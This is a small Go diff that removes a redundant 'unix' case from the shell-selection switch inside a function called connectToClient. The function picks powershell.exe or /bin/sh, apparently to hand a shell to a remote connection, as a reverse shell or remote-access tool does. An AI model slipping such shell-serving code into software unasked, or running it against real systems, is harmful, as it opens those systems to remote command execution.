@@ -45,8 +45,6 @@ func connectToClient(host string, port int) {
 			switch runtime.GOOS {
 			case "windows":
 				shell = "powershell.exe"
-			case "unix":
-				shell = "/bin/bash"
 			default:
 				shell = "/bin/sh"
 			}
